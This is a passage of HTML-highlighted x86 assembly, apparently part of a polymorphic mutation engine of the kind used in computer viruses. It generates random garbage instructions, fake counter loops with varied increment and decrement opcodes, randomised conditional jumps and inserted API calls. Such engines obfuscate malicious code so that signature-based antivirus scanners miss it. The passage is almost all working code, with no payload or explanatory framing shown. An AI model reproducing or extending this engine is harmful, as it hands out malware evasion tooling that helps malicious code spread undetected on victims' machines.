                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Make1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImInRandomLoop</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SelectedRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">              </span><span class="sc1">; Store PUSH</span><span class="sc0">
      </span><span class="sc5">@@OtherRandom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">            </span><span class="sc1">; Get a value that doesn't make any</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; problem when using either signed</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@OtherRandom</span><span class="sc0">       </span><span class="sc1">; or unsigned comparisions (this</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7FFFFFF7h</span><span class="sc0">    </span><span class="sc1">; means, the initial value of the</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@RandomOK</span><span class="sc0">          </span><span class="sc1">; counter and the final one - the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000008h</span><span class="sc0">    </span><span class="sc1">; compared - can be compared with</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@OtherRandom</span><span class="sc0">       </span><span class="sc1">; sign or without sign), so we can</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFF7h</span><span class="sc0">   </span><span class="sc1">; use JG/JGE/JA/JAE when decreasing</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@OtherRandom</span><span class="sc0">       </span><span class="sc1">; and JL/JLE/JB/JBE when increasing,</span><span class="sc0">
                                          </span><span class="sc1">; apart of J(N)Z/J(N)S for both</span><span class="sc0">
    </span><span class="sc5">@@RandomOK</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@InitLoopValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save that value</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">             </span><span class="sc1">; Make a mov with the selected reg.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">   </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">; Save the looping address</span><span class="sc0">
     </span><span class="sc5">@@RandomLoopAgain01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">   </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">; Did it make garbage?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RandomLoopAgain01</span><span class="sc0"> </span><span class="sc1">; If not, repeat</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">       </span><span class="sc1">; Select increasing or decreasing</span><span class="sc0">
                </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc0">                </span><span class="sc1">; Set it in AL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Increasing</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; Save this flag</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@IncreaseReg</span><span class="sc0">       </span><span class="sc1">; If ZF (AL=1), increase</span><span class="sc0">
     </span><span class="sc5">@@DecreaseReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; Get one of three types for decreasing:</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DecreaseReg</span><span class="sc0">   </span><span class="sc1">; DEC, ADD -1 or SUB 1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@DecreaseWithADD</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DecreaseWithSUB</span><span class="sc0">
     </span><span class="sc5">@@DecreaseWithDEC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">       </span><span class="sc1">; Opcode of DEC</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SelectedRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Bind the register to the</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                                </span><span class="sc1">; opcode and store it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@RL_Next01</span><span class="sc0">
     </span><span class="sc5">@@DecreaseWithADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C083h</span><span class="sc0">    </span><span class="sc1">; ADD Reg,(Dword-Packed-To-Byte)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SelectedRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                 </span><span class="sc1">; Store opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; ADD Reg,-1</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                 </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@RL_Next01</span><span class="sc0">     </span><span class="sc1">; Jump to complete</span><span class="sc0">
     </span><span class="sc5">@@DecreaseWithSUB</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E883h</span><span class="sc0">    </span><span class="sc1">; SUB Reg,(Dword-Packed-To-Byte)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SelectedRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                 </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; SUB Reg,1</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                 </span><span class="sc1">; Store the value</span><span class="sc0">
     </span><span class="sc5">@@RL_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">        </span><span class="sc1">; Get a number between 4 and 7</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@InitLoopValue</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Subtract it to the initial</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; value and get the final value</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@PutComparisionForLoop</span><span class="sc0">  </span><span class="sc1">; Jump to complete</span><span class="sc0">
          </span><span class="sc1">; Here if we increase</span><span class="sc0">
     </span><span class="sc5">@@IncreaseReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">        </span><span class="sc1">; Get randomly INC, ADD 1 or SUB -1</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@IncreaseReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@IncreaseWithADD</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@IncreaseWithSUB</span><span class="sc0">
     </span><span class="sc5">@@IncreaseWithDEC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; INC Reg</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SelectedRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                 </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@RL_Next02</span><span class="sc0">     </span><span class="sc1">; Jump to continue</span><span class="sc0">
     </span><span class="sc5">@@IncreaseWithADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C083h</span><span class="sc0">    </span><span class="sc1">; ADD Reg,(Dword-Packed-To-Byte)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SelectedRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                 </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">       </span><span class="sc1">; ADD Reg,1</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                 </span><span class="sc1">; Store the value</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@RL_Next02</span><span class="sc0">     </span><span class="sc1">; Jump to continue</span><span class="sc0">
     </span><span class="sc5">@@IncreaseWithSUB</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E883h</span><span class="sc0">    </span><span class="sc1">; SUB Reg,(Dword-Packed-To-Byte)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SelectedRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Bind the register</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                 </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; SUB Reg,-1</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                 </span><span class="sc1">; Store the value</span><span class="sc0">
     </span><span class="sc5">@@RL_Next02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">        </span><span class="sc1">; Get a value between 4 and 7</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@InitLoopValue</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add it to the initial</span><span class="sc0">
                                               </span><span class="sc1">; value to get the final value</span><span class="sc0">
     </span><span class="sc5">@@PutComparisionForLoop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Save the final value of the counter</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SelectedRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Is EAX the re-</span><span class="sc0">
                                                 </span><span class="sc1">; gister that we are using?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CMP_EAX</span><span class="sc0">      </span><span class="sc1">; If it is, use the EAX exclusive opcode</span><span class="sc0">
                                     </span><span class="sc1">; to do CMP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F881h</span><span class="sc0">   </span><span class="sc1">; Opcode of CMP</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SelectedRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@RL_Next03</span><span class="sc0">    </span><span class="sc1">; Jump and continue</span><span class="sc0">
     </span><span class="sc5">@@CMP_EAX</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">      </span><span class="sc1">; Use the opcode of CMP EAX,Value</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                </span><span class="sc1">; Store it</span><span class="sc0">
   </span><span class="sc5">@@RL_Next03</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Get the value to CMP</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">              </span><span class="sc1">; Store the value</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Increasing</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX=0 or 1</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">; EBX=0 or 8</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">@@JumpsForLoopD</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EBX=Address of jumps</span><span class="sc0">
                                                        </span><span class="sc1">; table</span><span class="sc0">
   </span><span class="sc5">@@RL_Next04</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">       </span><span class="sc1">; Get a random number between 0 and 5</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@RL_Next04</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get a jump opcode</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Get the loop distance for the jump back</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">80h</span><span class="sc0">    </span><span class="sc1">; Check if we use the 8 bits opcode or</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@RL_Next05</span><span class="sc0">    </span><span class="sc1">; the 32 one. Jump if we use the 8 bits</span><span class="sc0">
                                     </span><span class="sc1">; conditional jump.</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">; Add 4 to the displacement back</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Convert the 8 bits opcode to the 32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">      </span><span class="sc1">; bits one</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">                </span><span class="sc1">; Store the displacement</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@RL_Next06</span><span class="sc0">    </span><span class="sc1">; Jump and continue</span><span class="sc0">
   </span><span class="sc5">@@RL_Next05</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">                </span><span class="sc1">; Store the 8 bits opcode</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                </span><span class="sc1">; Store the displacement</span><span class="sc0">
   </span><span class="sc5">@@RL_Next06</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SelectedRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">  </span><span class="sc1">; Store POP with the used register</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImInRandomLoop</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">

</span><span class="sc5">@@JumpsForLoopD</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc1">;       JNS, JNZ,  JA, JAE,  JG, JGE</span><span class="sc0">
</span><span class="sc5">@@JumpsForLoopI</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc1">;       JS,  JNZ,  JB, JBE,  JL, JLE</span><span class="sc0">
</span><span class="sc5">@@SelectedRegister</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@InitLoopValue</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@Increasing</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">@@Recurs_002</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">    </span><span class="sc1">; Select if we do a CALL or a jump</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DoConditionalJump</span><span class="sc0">  </span><span class="sc1">; Make a conditional jump if ZF</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@DoCALL</span><span class="sc0">
    </span><span class="sc5">@@APICall</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImInRandomLoop</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InsertAPICall</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">
    </span><span class="sc5">@@DoCALL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NormalCALL</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
